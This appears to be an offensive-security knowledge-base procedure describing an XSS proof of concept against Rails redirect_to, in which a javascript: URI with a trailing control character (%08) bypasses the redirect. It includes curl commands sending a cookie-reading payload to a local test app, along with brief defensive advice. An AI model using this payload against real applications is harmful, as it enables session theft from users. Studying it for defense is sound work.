---
id: proc-rails-inject-001
tags:
  - xss
  - inject
  - javascript-uri
  - control-character
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/rails-redirect-xss-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.004Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-JavaScript-URI-with-Control-Character

## Summary

This procedure injects a javascript: URI payload appended with a control character (e.g., %08 backspace) into the redirect_url parameter, causing Rack to strip the Location header due to RFC7230 non-compliance and embedding the URI in the fallback HTML response.

## Description

The attack targets the redirect_to function in Rails controllers. By including control characters like %08 (%01-%08, %0b, %0c, %0e-%1f) in the URL, Rack linters remove the invalid Location header, falling back to an HTML page with an <a href> tag controlled by the attacker. This injects executable JavaScript. Tested on Rails 7.0.4.3 with Puma. Prerequisites: Running vulnerable app from setup procedure. Outcome: Response HTML with injectable href.

## Requirements

1. Vulnerable Rails app running on localhost:3000
2. curl or similar HTTP client for requests
3. Knowledge of URL encoding for control characters

## Defense

Defensive measures and detection strategies:

- Sanitize redirect parameters to strip control characters and block non-http/https schemes
- Implement Content-Security-Policy (CSP) to prevent javascript: execution
- Log and alert on redirect requests with unusual characters in parameters

## Objectives

1. Deliver payload to bypass redirect and inject into HTML
2. Confirm header stripping via response inspection
3. Prepare for user interaction to trigger XSS

## Instructions

### Step 1: Craft and Send Malicious Request

**Context**: Use a GET request to the /vuln endpoint with the payload to trigger the vulnerability.

**Command** ([[commands/rails-redirect-xss-poc]]):
```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

> The %08 backspace causes the Location header to be invalid per RFC7230, stripped by Rack. Expected output: 302 without Location, HTML body with <a href="javascript:alert(document.cookie) ">redirected</a>.

### Step 2: Inspect Response

**Context**: Verify injection by checking the response body for the href attribute.

**Command** (curl with output save):
```bash
curl "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08" -o response.html
cat response.html
```

> Confirms the fallback HTML contains the injected URI. Success if no redirect occurs and JS is in href.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/rails-redirect-xss-poc]]

## Tools Used

- None

## Tags

- xss
- inject
- javascript-uri
- control-character
